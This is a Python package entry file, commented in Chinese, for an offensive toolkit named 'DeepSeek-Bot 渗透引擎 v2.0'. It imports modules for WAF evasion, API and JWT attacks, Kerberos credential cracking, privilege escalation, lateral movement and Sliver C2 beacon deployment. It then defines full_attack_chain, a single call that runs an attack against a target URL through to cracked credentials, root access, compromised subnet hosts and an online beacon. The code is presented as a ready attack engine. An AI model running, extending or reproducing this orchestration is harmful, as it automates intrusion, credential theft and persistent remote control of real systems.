"""
DeepSeek-Bot 渗透引擎 v2.0
───────────────────────────────────────────
完整攻击链覆盖: 信息收集 → Web打点 → 提权 → 横向移动 → 持久化

模块导览:
  引擎层:
    waf_evasion        - WAF逃逸引擎 (647行, 300+变体)
    parallel           - 并行调度引擎 (333行, 5x加速)
    playbook           - 自动化渗透脚本 (476行)
    adaptive_chain     - 自适应攻击链 (437行) ✨NEW

  攻击层:
    api_attack         - API攻击面 (750行) ✨NEW
    credential_attack  - 凭证攻击/Kerberos全家桶 (560行) ✨NEW
    privesc            - 提权自动化 (460行) ✨NEW
    lateral_movement   - 内网横向移动 (620行) ✨NEW

  C2层:
    c2_integration     - C2集成 (710行) ✨NEW

  辅助层:
    auto_verify/       - 漏洞验证闭环 (1321行)
    gdb_wrapper        - GDB堆利用封装 (333行)
    bot/parser/reporter/db/scheduler/rich_msg...

总计: ~6200行自研渗透代码
"""

# 引擎层
from .waf_evasion import WAFEvader, ATTACK_TYPES, WAF_PROFILES
from .parallel import ParallelScheduler, batch_playbook, TargetJob, BatchResult
from .playbook import Playbook, run_full, run_recon, run_port_scan, run_web_scan, run_vuln_scan
from .adaptive_chain import AdaptiveChain, TargetProfile, ChainStrategy, adaptive_attack

# 攻击层
from .api_attack import APIAttacker, JWTAttacker, GraphQLAttacker, OpenAPIAttacker
from .credential_attack import CredentialAttack, HashEntry, CredentialReport
from .privesc import PrivescEngine, PrivFinding, PrivResult
from .lateral_movement import LateralMover, HostInfo, MoveMethod, MoveResult, BloodHoundPath

# C2层
from .c2_integration import (
    C2Manager, BeaconConfig, BeaconSession, BeaconType, C2Protocol,
    BeaconGenerator, SliverManager, BeaconDeployer,
)

# 辅助层
from .gdb_wrapper import GDB, GDBProcess, MemoryDump
from .db import init as db_init, project_create, project_list

# ==================== 一键全流程 ====================

def full_attack_chain(target_url: str, project_id: int, uid: int = 0,
                      subnet: str = "", domain: str = "",
                      credential: tuple = ("", "")) -> dict:
    """
    一键完整攻击链 — 从Web打点到内网横向
    
    Returns:
        {
            "web": {...},        # Web攻击结果
            "privesc": {...},    # 提权结果
            "lateral": {...},    # 横向移动结果
            "credentials": {...},# 凭证攻击结果
            "api": {...},        # API攻击结果
            "c2": {...},         # C2部署结果
            "summary": str       # 总摘要
        }
    """
    from .adaptive_chain import AdaptiveChain
    from .privesc import PrivescEngine
    from .lateral_movement import LateralMover
    from .credential_attack import CredentialAttack
    from .api_attack import APIAttacker
    from .c2_integration import C2Manager, BeaconType

    report = {"target": target_url, "started_at": __import__("time").time()}

    # 阶段1: Web自适应攻击
    ac = AdaptiveChain(project_id, uid)
    ac.probe(target_url)
    web_results = ac.run(target_url)
    report["web"] = {
        "profile": ac.get_profile().__dict__ if ac.get_profile() else {},
        "findings": ac.get_findings(),
        "actions": len(web_results)
    }

    # 阶段2: API攻击
    aa = APIAttacker(project_id, uid)
    api_result = aa.full_api_attack(target_url)
    report["api"] = api_result

    # 阶段3: 凭证攻击 (如果有域)
    if domain and credential[0]:
        ca = CredentialAttack(project_id, uid)
        cred_report = ca.full_credential_attack(domain, target_url, credential)
        report["credentials"] = {
            "asrep_hashes": len(cred_report.asrep_hashes),
            "kerberoast_tickets": len(cred_report.kerberoast_tickets),
            "cracked": sum(1 for c in cred_report.cracked_passwords if c.cracked)
        }

    # 阶段4: 提权
    if credential[0]:
        pe = PrivescEngine(project_id, uid)
        priv_result = pe.auto_privesc(target_url, "auto", credential)
        report["privesc"] = {
            "findings": len(priv_result.get("findings", [])),
            "root_obtained": priv_result.get("root_obtained", False)
        }

    # 阶段5: 内网横向
    if subnet and credential[0]:
        lm = LateralMover(project_id, uid)
        lateral_result = lm.full_lateral(subnet, domain, credential)
        report["lateral"] = {
            "hosts_discovered": lateral_result.get("hosts_discovered", 0),
            "hosts_compromised": lateral_result.get("hosts_compromised", 0)
        }

    # 阶段6: C2部署
    if report.get("privesc", {}).get("root_obtained") or credential[0]:
        c2 = C2Manager(project_id, uid)
        c2_result = c2.quick_deploy(target_url, credential, target_url, 443, domain)
        report["c2"] = {
            "deployed": c2_result.get("success", False),
            "beacon_online": c2_result.get("beacon_online", False)
        }

    report["elapsed"] = __import__("time").time() - report["started_at"]

    # 总摘要
    findings_total = (
        len(report.get("web", {}).get("findings", [])) +
        len(report.get("api", {}).get("swagger", [])) +
        report.get("credentials", {}).get("cracked", 0)
    )

    report["summary"] = f"""
╔══════════════════════════════════════╗
║   DeepSeek-Bot 全攻击链报告 v2.0    ║
╠══════════════════════════════════════╣
║ 目标: {target_url:<30} ║
║ 耗时: {report['elapsed']:.0f}s{' ' * (30 - len(str(int(report['elapsed']))))} ║
╠══════════════════════════════════════╣
║ Web发现:     {len(report.get('web',{}).get('findings',[])):<4}                  ║
║ API端点:     {len(report.get('api',{}).get('swagger',[])):<4}                  ║
║ 凭证破解:    {report.get('credentials',{}).get('cracked',0):<4}                  ║
║ 提权成功:    {'✅' if report.get('privesc',{}).get('root_obtained') else '❌':<4}                  ║
║ 横向移动:    {report.get('lateral',{}).get('hosts_compromised',0):<4}                  ║
║ C2上线:      {'✅' if report.get('c2',{}).get('beacon_online') else '❌':<4}                  ║
╠══════════════════════════════════════╣
║ 总发现: {findings_total:<4}                       ║
╚══════════════════════════════════════╝
"""
    return report
